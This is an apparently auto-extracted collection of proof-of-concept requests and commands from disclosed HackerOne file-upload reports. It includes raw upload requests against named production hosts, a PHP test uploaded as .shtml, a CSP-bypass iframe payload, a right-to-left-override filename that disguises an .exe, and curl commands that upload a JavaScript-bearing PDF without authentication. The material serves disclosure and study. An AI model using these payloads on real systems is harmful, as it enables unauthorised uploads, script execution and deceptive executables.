# Unrestricted file upload — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #1606957 Unrestricted File Upload on reddit.secure.force.com — reddit — $100 — None
Source: `hackerone/reports/2022/1606957.md` (https://hackerone.com/reports/1606957)

```
POST /adhelp/apexremote HTTP/1.1
Host: reddit.secure.force.com
████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://reddit.secure.force.com/adhelp/
X-User-Agent: Visualforce-Remoting
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 15301
Origin: https://reddit.secure.force.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"action":"AdvertisingHelpController","method":"uploadFile","data":["UEsDBBQABgAIAAAAIQDfpNJsWgEAACAFAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC0lMtuwjAQRfeV+g+Rt1Vi6KKqKgKLPpYtUukHGHsCVv2Sx7z+vhMCUVUBkQpsIiUz994zVsaD0dqabAkRtXcl6xc9loGTXmk3K9nX5C1/ZBkm4ZQw3kHJNoBs
```

```
HTTP/1.1 200 OK
Date: Mon, 20 Jun 2022 08:41:53 GMT
Strict-Transport-Security: max-age=63072000; includeSubDomains
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: origin-when-cross-origin
Cache-Control: no-cache,must-revalidate,max-age=0,no-store,private
Content-Type: application/json;charset=UTF-8
X-Powered-By: Salesforce.com Visualforce
Vary: Accept-Encoding
Connection: close
Content-Length: 142

[{"statusCode":200,"type":"rpc","tid":3,"ref":false,"action":"AdvertisingHelpController","method":"uploadFile","result":"00P5c00001leROKEA2"}]
```

```
POST /adhelp/apexremote HTTP/1.1
Host: reddit.secure.force.com
████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://reddit.secure.force.com/adhelp/
X-User-Agent: Visualforce-Remoting
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 15301
Origin: https://reddit.secure.force.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"action":"AdvertisingHelpController","method":"uploadFile","data":["UEsDBBQABgAIAAAAIQDfpNJsWgEAACAFAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## #412481 China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability — starbucks — - — Privilege Escalation
Source: `hackerone/reports/2020/412481.md` (https://hackerone.com/reports/412481)

```
POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
Host: ecjobsdc.starbucks.com.cn
Connection: close
Content-Length: 234
Cache-Control: max-age=0
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundaryevPInYidBxSvSd06
Content-Disposition: form-data; name="hxwebfileboxcontrol_upload_file_inputbox"; filename="xxx.shtml"
Content-Type: text/html

<?php echo 1111;>
------WebKitFormBoundaryevPInYidBxSvSd06--
```

```
DOCUMENT_NAMED:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
SERVER_SOFTWARE :Microsoft-IIS/8.5
SERVER_NAME :ecjobsdc.starbucks.com.cn
SERVER_PORT :80
REMOTE_ADDR:10.92.29.50
REMOTE_HOST:10.92.29.50
D:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
PATH_INFO:/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <httpRedirect enabled="false" destination="https://ecjobs.starbucks.net" exactDestination="false" />
    </system.webServer>
</configuration>
```

```
POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
Host: ecjobsdc.starbucks.com.cn
Connection: close
Content-Length: 234
Cache-Control: max-age=0
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundaryevPInYidBxSvSd06
```

## #845832 SVG file upload leads to XML injection — lab45 — - — XML Injection
Source: `hackerone/reports/2020/845832.md` (https://hackerone.com/reports/845832)

```
                            https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#billion-laugh-attack
```

```
       https://api.topcoder.com/v3/members/oldsoul/photoUploadUrl
       with a POST parameter "contentType" telling the type of file being uploaded. I changed the value to "image/svg+xml".  
       Now, the response had a preSignedURL variable pointing to the valid S3 object creation URL, and a token variable which gives a random number which is added to the file name which is being uploaded.
                                     F781757
```

```
       with a token variable which is same as the token variable which we received in the first request. Also a variable "contentType" which is used in determining the extension of the file being uploaded. I changed the value to "image/svg+xml"
                                     F781767
```

## #1380157 Content-Security Policy bypass with File Uploads — rocket_chat — - — None
Source: `hackerone/reports/2024/1380157.md` (https://hackerone.com/reports/1380157)

```
<iframe srcdoc="&#x3c;script src='/file-upload/<UPLOAD ID>/payload.js?download'></script>">
```

## #3490059 Unicode RTLO character allowed in uploaded filenames leading to executable file upload and misleading UI handling in Nextcloud Notes — nextcloud — - — Violation of Secure Design Principles
Source: `hackerone/reports/2026/3490059.md` (https://hackerone.com/reports/3490059)

```
   touch "invoice$(printf '\u202E')fdp.exe"
   
```

```
   invoicefdp.exe
   
```

```
invoice<U+202E>fdp.exe
```

## #3765476 Unauthenticated File Upload with CORS Wildcard and No Rate Limiting on ████████ and ████████ — essity — - — Missing Authentication for Critical Function
Source: `hackerone/reports/2026/3765476.md` (https://hackerone.com/reports/3765476)

```
# Create a minimal valid PNG
printf '\x89PNG\r\n\x1a\n' > /tmp/test.png

# Upload without any authentication
curl -sk -X POST 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -F 'file=@/tmp/test.png;type=image/png;filename=test.png'
```

```
# Create a PDF that executes JavaScript when opened
cat > /tmp/malicious.pdf << 'EOF'
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('matty69v XSS PoC - document.domain')) >>
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000074 00000 n 
0000000120 00000 n 
0000000179 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
285
%%EOF
EOF

curl -sk -X POST 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -F 'file=@/tmp/malicious.pdf;type=application/pdf;filename=matty69v_poc.pdf'
```

```
# Preflight check from evil origin
curl -sk -X OPTIONS 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' \
  -H 'Origin: https://evil.attacker.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: X-Requested-With'
```

